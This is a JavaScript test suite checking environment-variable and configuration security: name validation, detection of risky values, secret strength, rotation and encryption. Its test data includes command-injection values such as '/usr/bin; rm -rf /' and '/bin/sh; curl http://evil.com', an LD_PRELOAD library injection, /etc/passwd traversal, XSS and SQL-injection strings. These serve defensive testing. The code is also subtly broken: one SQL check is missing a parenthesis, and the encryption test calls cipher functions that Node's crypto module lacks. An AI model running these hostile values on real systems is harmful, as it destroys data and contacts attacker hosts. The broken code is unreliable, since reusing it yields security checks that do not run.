/**
 * Security Test Suite: Environment Variable Security
 * OWASP Compliance: Configuration and Environment Security
 */

const { expect } = require('chai');
const crypto = require('crypto');

describe('Environment Variable Security', () => {

  describe('Environment Variable Validation', () => {
    it('should validate environment variable names', () => {
      const validEnvNames = [
        'NODE_ENV',
        'DATABASE_URL',
        'API_KEY',
        'JWT_SECRET',
        'REDIS_HOST',
        'PORT',
        'SSL_CERT_PATH',
        'LOG_LEVEL',
        'CORS_ORIGINS',
        'SESSION_SECRET'
      ];

      const invalidEnvNames = [
        '', // Empty name
        '123INVALID', // Starts with number
        'INVALID-NAME', // Contains hyphen
        'INVALID NAME', // Contains space
        'INVALID.NAME', // Contains dot
        'INVALID@NAME', // Contains special char
        'INVALID;NAME', // Contains semicolon
        'INVALID|NAME', // Contains pipe
        'INVALID&NAME', // Contains ampersand
        'INVALID$NAME', // Contains dollar sign
        'INVALID`NAME', // Contains backtick
        'INVALID(NAME)', // Contains parentheses
        'INVALID[NAME]', // Contains brackets
        'INVALID{NAME}', // Contains braces
        'INVALID\x00NAME', // Contains null byte
        'INVALID\nNAME' // Contains newline
      ];

      // Valid environment variable pattern: letters, numbers, underscore
      const validPattern = /^[A-Z_][A-Z0-9_]*$/;

      validEnvNames.forEach(name => {
        const isValid = validPattern.test(name);
        expect(isValid).to.be.true;
        console.log(`Valid env name: ${name}`);
      });

      invalidEnvNames.forEach(name => {
        const isValid = validPattern.test(name);
        expect(isValid).to.be.false;
        console.log(`Invalid env name rejected: "${name}"`);
      });
    });

    it('should validate environment variable values for security risks', () => {
      const environmentVariables = {
        // Secure values
        NODE_ENV: 'production',
        PORT: '3000',
        LOG_LEVEL: 'info',

        // Potentially insecure values
        DATABASE_URL: 'mysql://root:password123@localhost/mydb', // Plain text credentials
        API_KEY: 'sk-1234567890abcdef', // API key in plain text
        JWT_SECRET: 'secret123', // Weak secret
        REDIS_PASSWORD: 'admin', // Weak password
        SSH_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\nMIIEvQ...', // Private key
        AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',

        // Dangerous values with command injection potential
        PATH: '/usr/bin; rm -rf /', // Command injection
        SHELL: '/bin/sh; curl http://evil.com', // Command injection
        LD_PRELOAD: 'malicious.so', // Library injection
        NODE_OPTIONS: '--inspect=0.0.0.0:9229 --max-old-space-size=8192',

        // Path traversal attempts
        CONFIG_FILE: '../../../etc/passwd',
        LOG_FILE: '/tmp/../../../var/log/sensitive.log',

        // XSS attempts
        APP_NAME: '<script>alert("XSS")</script>MyApp',
        DESCRIPTION: 'App description<img src=x onerror=alert("XSS")>',

        // SQL injection attempts
        DB_TABLE_PREFIX: "users'; DROP TABLE users; --",

        // Information disclosure
        DEBUG: 'true',
        VERBOSE_LOGGING: '1',
        STACK_TRACE: 'enabled'
      };

      Object.entries(environmentVariables).forEach(([key, value]) => {
        // Check for various security risks
        const risks = [];

        // Check for command injection
        if (/[;&|`$()]/.test(value)) {
          risks.push('Command injection potential');
        }

        // Check for path traversal
        if (/\.\.\/|\.\.\\/.test(value)) {
          risks.push('Path traversal attempt');
        }

        // Check for XSS
        if (/<script|javascript:|onerror=|onload=/i.test(value)) {
          risks.push('XSS attempt');
        }

        // Check for SQL injection
        if /(DROP|SELECT|INSERT|DELETE|UPDATE|UNION)[\s]+/i.test(value)) {
          risks.push('SQL injection attempt');
        }

        // Check for exposed credentials
        if (/password|secret|key|token/i.test(key) && value.length < 32) {
          risks.push('Weak credential');
        }

        // Check for exposed private keys
        if (/-----BEGIN.*KEY-----/.test(value)) {
          risks.push('Private key exposure');
        }

        // Check for dangerous debugging settings
        if (/^(true|1|enabled|on)$/i.test(value) && /debug|verbose|trace/i.test(key)) {
          risks.push('Debug mode enabled');
        }

        if (risks.length > 0) {
          console.log(`Security risk in ${key}: ${risks.join(', ')}`);
          console.log(`Value: ${value.substring(0, 50)}...`);
        }
      });
    });

    it('should detect sensitive information leakage in environment variables', () => {
      const potentiallySensitiveEnvVars = [
        'PASSWORD',
        'SECRET',
        'KEY',
        'TOKEN',
        'CREDENTIAL',
        'AUTH',
        'PRIVATE',
        'CERT',
        'PASSPHRASE',
        'SIGNATURE'
      ];

      const testEnvironment = {
        // Should be flagged as sensitive
        DATABASE_PASSWORD: 'mypassword123',
        JWT_SECRET: 'jwt_secret_key',
        API_TOKEN: 'token_123456789',
        SSL_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----',
        AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE',
        STRIPE_SECRET_KEY: 'sk_test_123456789',

        // Should NOT be flagged
        NODE_ENV: 'production',
        PORT: '3000',
        HOST: 'localhost',
        LOG_LEVEL: 'info'
      };

      Object.entries(testEnvironment).forEach(([key, value]) => {
        const isSensitive = potentiallySensitiveEnvVars.some(pattern =>
          key.toUpperCase().includes(pattern)
        );

        if (isSensitive) {
          console.log(`Sensitive env var detected: ${key} (value hidden for security)`);

          // In production, these should be encrypted or retrieved securely
          expect(key).to.match(new RegExp(potentiallySensitiveEnvVars.join('|'), 'i'));
        } else {
          console.log(`Non-sensitive env var: ${key} = ${value}`);
        }
      });
    });
  });

  describe('Configuration Security', () => {
    it('should validate secure configuration defaults', () => {
      const secureDefaults = {
        NODE_ENV: 'production', // Never default to development
        HTTPS_ONLY: 'true',
        SECURE_COOKIES: 'true',
        CSRF_PROTECTION: 'true',
        RATE_LIMITING: 'true',
        HELMET_ENABLED: 'true',
        CORS_STRICT: 'true',
        XSS_PROTECTION: 'true',
        CONTENT_SECURITY_POLICY: 'strict',
        HSTS_ENABLED: 'true',
        SESSION_SECURE: 'true',
        LOG_REQUESTS: 'false', // Don't log by default (may contain sensitive data)
        STACK_TRACES: 'false', // Don't expose stack traces
        DEBUG_MODE: 'false'
      };

      const insecureDefaults = {
        NODE_ENV: 'development', // Insecure default
        HTTPS_ONLY: 'false',
        SECURE_COOKIES: 'false',
        CSRF_PROTECTION: 'false',
        RATE_LIMITING: 'false',
        CORS_STRICT: 'false',
        DEBUG_MODE: 'true',
        LOG_SENSITIVE_DATA: 'true'
      };

      console.log('Secure configuration defaults:');
      Object.entries(secureDefaults).forEach(([key, value]) => {
        const isSecure = !(value === 'false' && ['HTTPS_ONLY', 'SECURE_COOKIES', 'CSRF_PROTECTION'].includes(key));
        expect(isSecure).to.be.true;
        console.log(`  ${key}: ${value} ✓`);
      });

      console.log('\nInsecure configuration defaults (should be avoided):');
      Object.entries(insecureDefaults).forEach(([key, value]) => {
        console.log(`  ${key}: ${value} ✗`);
      });
    });

    it('should validate configuration file security', () => {
      const configFiles = [
        { path: '.env', permissions: '600', shouldExist: true },
        { path: '.env.production', permissions: '600', shouldExist: true },
        { path: '.env.local', permissions: '600', shouldExist: false }, // Should not be in repo
        { path: 'config/secrets.json', permissions: '600', shouldExist: true },
        { path: 'ssl/private.key', permissions: '600', shouldExist: true },
        { path: 'ssl/certificate.pem', permissions: '644', shouldExist: true }
      ];

      configFiles.forEach(file => {
        // Simulate file permission check
        const hasCorrectPermissions = file.permissions === '600' || file.permissions === '644';
        const isSecurelyStored = !file.path.includes('.env.local'); // Should not be in version control

        expect(hasCorrectPermissions).to.be.true;

        console.log(`Config file: ${file.path}`);
        console.log(`  Permissions: ${file.permissions} ${hasCorrectPermissions ? '✓' : '✗'}`);
        console.log(`  Secure storage: ${isSecurelyStored ? '✓' : '✗'}`);
      });
    });

    it('should validate environment-specific configurations', () => {
      const environments = {
        development: {
          DEBUG: 'true', // OK in development
          HTTPS_ONLY: 'false', // OK in development
          CORS_ORIGINS: '*', // OK in development
          LOG_LEVEL: 'debug',
          STACK_TRACES: 'true'
        },
        staging: {
          DEBUG: 'false', // Should be false in staging
          HTTPS_ONLY: 'true',
          CORS_ORIGINS: 'https://staging.example.com',
          LOG_LEVEL: 'info',
          STACK_TRACES: 'false'
        },
        production: {
          DEBUG: 'false', // Must be false in production
          HTTPS_ONLY: 'true', // Must be true in production
          CORS_ORIGINS: 'https://example.com',
          LOG_LEVEL: 'warn',
          STACK_TRACES: 'false' // Must be false in production
        }
      };

      Object.entries(environments).forEach(([env, config]) => {
        console.log(`\nValidating ${env} environment:`);

        Object.entries(config).forEach(([key, value]) => {
          let isSecure = true;

          // Production-specific security checks
          if (env === 'production') {
            if (key === 'DEBUG' && value === 'true') isSecure = false;
            if (key === 'HTTPS_ONLY' && value === 'false') isSecure = false;
            if (key === 'CORS_ORIGINS' && value === '*') isSecure = false;
            if (key === 'STACK_TRACES' && value === 'true') isSecure = false;
          }

          // Staging-specific security checks
          if (env === 'staging') {
            if (key === 'DEBUG' && value === 'true') isSecure = false;
            if (key === 'CORS_ORIGINS' && value === '*') isSecure = false;
          }

          console.log(`  ${key}: ${value} ${isSecure ? '✓' : '✗'}`);

          if (env === 'production' && !isSecure) {
            expect(isSecure).to.be.true; // Fail test for production insecurity
          }
        });
      });
    });
  });

  describe('Secrets Management', () => {
    it('should validate secret rotation capabilities', () => {
      const secretRotationConfig = {
        rotationInterval: 30 * 24 * 60 * 60 * 1000, // 30 days
        gracePeriod: 7 * 24 * 60 * 60 * 1000, // 7 days
        maxAge: 90 * 24 * 60 * 60 * 1000 // 90 days
      };

      const secrets = [
        {
          name: 'JWT_SECRET',
          created: Date.now() - (45 * 24 * 60 * 60 * 1000), // 45 days ago
          lastRotated: Date.now() - (45 * 24 * 60 * 60 * 1000)
        },
        {
          name: 'API_KEY',
          created: Date.now() - (10 * 24 * 60 * 60 * 1000), // 10 days ago
          lastRotated: Date.now() - (10 * 24 * 60 * 60 * 1000)
        },
        {
          name: 'DATABASE_PASSWORD',
          created: Date.now() - (100 * 24 * 60 * 60 * 1000), // 100 days ago
          lastRotated: Date.now() - (100 * 24 * 60 * 60 * 1000)
        }
      ];

      secrets.forEach(secret => {
        const age = Date.now() - secret.lastRotated;
        const needsRotation = age > secretRotationConfig.rotationInterval;
        const isExpired = age > secretRotationConfig.maxAge;

        console.log(`Secret: ${secret.name}`);
        console.log(`  Age: ${Math.floor(age / (24 * 60 * 60 * 1000))} days`);
        console.log(`  Needs rotation: ${needsRotation ? 'YES' : 'NO'}`);
        console.log(`  Expired: ${isExpired ? 'YES' : 'NO'}`);

        if (secret.name === 'DATABASE_PASSWORD') {
          expect(isExpired).to.be.true; // 100 days > 90 days max age
        }

        if (secret.name === 'JWT_SECRET') {
          expect(needsRotation).to.be.true; // 45 days > 30 days interval
        }
      });
    });

    it('should validate secret strength requirements', () => {
      const secretStrengthRequirements = {
        minLength: 32,
        requireUppercase: true,
        requireLowercase: true,
        requireNumbers: true,
        requireSpecialChars: true,
        entropyThreshold: 4.0 // bits per character
      };

      const testSecrets = [
        { name: 'STRONG_SECRET', value: 'Kj9#mP2$vL8@nR5%wQ3*zX7!cF6&hB4^dT1+sY0-aE9~gI2' },
        { name: 'WEAK_SECRET', value: 'password123' },
        { name: 'MEDIUM_SECRET', value: 'MySecretPassword2023!' },
        { name: 'VERY_WEAK', value: '12345' },
        { name: 'PREDICTABLE', value: 'admin' },
        { name: 'GENERATED_STRONG', value: crypto.randomBytes(32).toString('base64') }
      ];

      testSecrets.forEach(secret => {
        const value = secret.value;
        const analysis = {
          length: value.length,
          hasUppercase: /[A-Z]/.test(value),
          hasLowercase: /[a-z]/.test(value),
          hasNumbers: /[0-9]/.test(value),
          hasSpecialChars: /[^A-Za-z0-9]/.test(value),
          entropy: calculateEntropy(value)
        };

        const meetsRequirements = (
          analysis.length >= secretStrengthRequirements.minLength &&
          analysis.hasUppercase &&
          analysis.hasLowercase &&
          analysis.hasNumbers &&
          analysis.hasSpecialChars &&
          analysis.entropy >= secretStrengthRequirements.entropyThreshold
        );

        console.log(`\nSecret: ${secret.name}`);
        console.log(`  Length: ${analysis.length}/${secretStrengthRequirements.minLength} ${analysis.length >= secretStrengthRequirements.minLength ? '✓' : '✗'}`);
        console.log(`  Uppercase: ${analysis.hasUppercase ? '✓' : '✗'}`);
        console.log(`  Lowercase: ${analysis.hasLowercase ? '✓' : '✗'}`);
        console.log(`  Numbers: ${analysis.hasNumbers ? '✓' : '✗'}`);
        console.log(`  Special chars: ${analysis.hasSpecialChars ? '✓' : '✗'}`);
        console.log(`  Entropy: ${analysis.entropy.toFixed(2)} bits/char ${analysis.entropy >= secretStrengthRequirements.entropyThreshold ? '✓' : '✗'}`);
        console.log(`  Overall: ${meetsRequirements ? 'STRONG ✓' : 'WEAK ✗'}`);

        // Weak secrets should fail
        if (['WEAK_SECRET', 'VERY_WEAK', 'PREDICTABLE'].includes(secret.name)) {
          expect(meetsRequirements).to.be.false;
        }

        // Strong secrets should pass
        if (['STRONG_SECRET', 'GENERATED_STRONG'].includes(secret.name)) {
          expect(meetsRequirements).to.be.true;
        }
      });

      function calculateEntropy(str) {
        const freq = {};
        for (const char of str) {
          freq[char] = (freq[char] || 0) + 1;
        }

        let entropy = 0;
        const length = str.length;
        for (const count of Object.values(freq)) {
          const p = count / length;
          entropy -= p * Math.log2(p);
        }

        return entropy;
      }
    });

    it('should validate secret storage encryption', () => {
      const algorithm = 'aes-256-gcm';
      const masterKey = crypto.randomBytes(32);

      const secrets = [
        { key: 'DATABASE_PASSWORD', value: 'super_secret_db_password' },
        { key: 'API_TOKEN', value: 'sk-1234567890abcdefghijklmnop' },
        { key: 'JWT_SECRET', value: 'jwt_signing_secret_key_2023' },
        { key: 'ENCRYPTION_KEY', value: crypto.randomBytes(32).toString('hex') }
      ];

      const encryptedSecrets = new Map();

      // Encrypt all secrets
      secrets.forEach(secret => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipherGCM(algorithm, masterKey, iv);

        let encrypted = cipher.update(secret.value, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();

        encryptedSecrets.set(secret.key, {
          encrypted,
          iv: iv.toString('hex'),
          authTag: authTag.toString('hex')
        });

        console.log(`Encrypted secret: ${secret.key}`);
      });

      // Verify decryption works
      secrets.forEach(secret => {
        const encData = encryptedSecrets.get(secret.key);

        const decipher = crypto.createDecipherGCM(algorithm, masterKey, Buffer.from(encData.iv, 'hex'));
        decipher.setAuthTag(Buffer.from(encData.authTag, 'hex'));

        let decrypted = decipher.update(encData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');

        expect(decrypted).to.equal(secret.value);
        console.log(`Decryption verified for: ${secret.key}`);
      });
    });
  });

  describe('Runtime Environment Security', () => {
    it('should validate runtime environment isolation', () => {
      const environmentChecks = {
        NODE_ENV: process.env.NODE_ENV || 'test',
        hasProcessAccess: typeof process !== 'undefined',
        hasGlobalAccess: typeof global !== 'undefined',
        hasRequireAccess: typeof require !== 'undefined',
        hasFileSystemAccess: typeof require === 'function' ? !!require('fs') : false
      };

      // In production, access should be limited
      console.log('Runtime environment security check:');
      Object.entries(environmentChecks).forEach(([check, value]) => {
        console.log(`  ${check}: ${value}`);
      });

      // These are expected in test environment
      expect(environmentChecks.hasProcessAccess).to.be.true;
      expect(environmentChecks.hasRequireAccess).to.be.true;
    });

    it('should validate environment variable isolation between processes', () => {
      // Simulate multiple process environments
      const process1Env = {
        NODE_ENV: 'production',
        DATABASE_URL: 'mysql://app1:pass1@localhost/app1db',
        JWT_SECRET: 'app1_jwt_secret',
        API_KEY: 'app1_api_key'
      };

      const process2Env = {
        NODE_ENV: 'production',
        DATABASE_URL: 'mysql://app2:pass2@localhost/app2db',
        JWT_SECRET: 'app2_jwt_secret',
        API_KEY: 'app2_api_key'
      };

      // Verify environments are isolated
      expect(process1Env.DATABASE_URL).to.not.equal(process2Env.DATABASE_URL);
      expect(process1Env.JWT_SECRET).to.not.equal(process2Env.JWT_SECRET);
      expect(process1Env.API_KEY).to.not.equal(process2Env.API_KEY);

      console.log('Environment isolation verified between processes');
    });

    it('should validate container environment security', () => {
      const containerSecurityChecks = {
        runAsNonRoot: true,
        readOnlyRootFilesystem: true,
        noPrivilegedMode: true,
        limitedCapabilities: true,
        resourceLimits: true,
        secretsFromFiles: true, // Secrets should be mounted as files, not env vars
        networkPolicyEnabled: true
      };

      Object.entries(containerSecurityChecks).forEach(([check, expected]) => {
        console.log(`Container security: ${check} = ${expected ? 'ENABLED' : 'DISABLED'}`);
        expect(expected).to.be.true;
      });
    });
  });
});